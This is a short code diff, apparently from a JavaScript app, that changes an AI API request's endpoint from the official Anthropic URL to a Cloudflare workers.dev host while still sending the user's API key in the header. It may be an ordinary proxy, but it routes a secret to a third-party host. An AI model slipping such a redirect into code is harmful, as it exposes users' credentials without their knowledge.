@@ -600,7 +600,7 @@ Respond ONLY with a valid JSON array. No markdown, no preamble. Each item:
 }`;
 
   try {
-    const resp = await fetch('https://api.anthropic.com/v1/messages', {
+    const resp = await fetch('https://hidden-flower-a8ff.damandograa.workers.dev', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'x-api-key': apiKey, 'anthropic-version': '2023-06-01' },
       body: JSON.stringify({
